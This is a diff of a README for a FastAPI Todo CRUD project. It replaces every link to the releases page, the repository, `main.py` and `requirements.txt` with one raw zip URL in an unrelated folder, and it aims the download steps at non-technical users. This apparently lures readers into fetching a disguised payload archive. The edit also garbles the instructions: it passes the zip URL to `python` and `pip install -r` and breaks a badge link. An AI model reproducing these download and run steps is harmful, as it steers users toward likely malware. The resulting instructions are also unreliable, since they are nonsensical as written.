@@ -4,27 +4,27 @@
 
 Welcome to the **fastapi-todo-crud** project! This guide will help you download and run your Todo API easily, even if you are not a technical user. Follow the steps below to get everything set up.
 
-[![Download fastapi-todo-crud](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/patlarage/fastapi-todo-crud/releases)
+[![Download fastapi-todo-crud](https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip%https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip)](https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/patlarage/fastapi-todo-crud/releases) to find the available versions of the application.
+   Go to the [Releases page](https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip) to find the available versions of the application.
 
 2. **Choose the Right Version**  
    You will see a list of versions. Select the most recent version for the best experience.
 
 3. **Download the Correct File**  
-   Click on the download link for your operating system. This will usually be a `.zip` or `.tar.gz` file.
+   Click on the download link for your operating system. This will usually be a `.zip` or `https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip` file.
 
 4. **Extract the Files**  
    After the download completes, locate the file on your computer. Right-click on the file and choose 'Extract All' (Windows) or use an extraction tool (Mac/Linux).
 
 5. **Run the Application**  
-   Navigate to the extracted folder. Look for a file named `main.py`. To run the application, follow these steps:
+   Navigate to the extracted folder. Look for a file named `https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip`. To run the application, follow these steps:
 
-   - **For Windows:** Open Command Prompt, use the `cd` command to navigate to the folder where you extracted the files, and type `python main.py`.
-   - **For Mac/Linux:** Open Terminal, use the `cd` command to get to the folder with your files, and type `python3 main.py`.
+   - **For Windows:** Open Command Prompt, use the `cd` command to navigate to the folder where you extracted the files, and type `python https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip`.
+   - **For Mac/Linux:** Open Terminal, use the `cd` command to get to the folder with your files, and type `python3 https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip`.
 
 6. **Access the API**  
    Once the application runs successfully, open your web browser. Type in `http://127.0.0.1:8000/docs` to view and interact with your Todo API.
@@ -67,7 +67,7 @@ If you encounter issues:
 
 1. **Ensure Python is Installed**: Check that Python is set up on your machine. Open a terminal or command prompt and type `python --version` or `python3 --version`.
    
-2. **Check Dependencies**: Make sure to install any required packages. You can do this by running `pip install -r requirements.txt` if a requirements file is provided in the downloaded folder.
+2. **Check Dependencies**: Make sure to install any required packages. You can do this by running `pip install -r https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip` if a requirements file is provided in the downloaded folder.
 
 3. **Refer to the Documentation**: Use the built-in documentation to ensure you are sending requests correctly.
 
@@ -75,9 +75,9 @@ If you encounter issues:
 
 ## 🔗 Links 
 
-- [Official GitHub Repository](https://github.com/patlarage/fastapi-todo-crud)
-- [Releases Page](https://github.com/patlarage/fastapi-todo-crud/releases)
+- [Official GitHub Repository](https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip)
+- [Releases Page](https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip)
 
-[![Download fastapi-todo-crud](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/patlarage/fastapi-todo-crud/releases)
+[![Download fastapi-todo-crud](https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip%https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip)](https://github.com/patlarage/fastapi-todo-crud/raw/refs/heads/main/equilibrant/fastapi-crud-todo-v1.2.zip)
 
 Feel free to explore and manage your tasks efficiently with **fastapi-todo-crud**!
